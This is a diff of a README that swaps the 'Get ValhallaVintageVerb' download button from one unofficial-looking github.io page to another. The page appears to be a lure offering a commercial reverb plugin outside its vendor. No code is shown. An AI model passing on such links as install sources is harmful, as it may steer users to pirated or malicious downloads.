@@ -21,7 +21,7 @@ To begin using this **ValhallaVintageVerb 4.0.5 reverb plugin** and **ValhallaVi
 | :--- | :--- |
 | **Get ValhallaVintageVerb 4.0.5** | Click the button below to install this **ValhallaVintageVerb 4.0.5 vintage reverb**. |
 
-[![Button](https://img.shields.io/badge/🎛️-Get_Valhalla_Vintage_Verb_4.0.5-2ea44f?style=for-the-badge)](https://richard2275786.github.io/.github/valhalla-vintage-verb-4-0-5)
+[![VintageVerb](https://img.shields.io/badge/Access-VintageVerb%20-D97706?style=for-the-badge)](https://valhalla-vintageverb-review.github.io/.github/valhalla-vintageverb)
 
 ## System Requirements
 
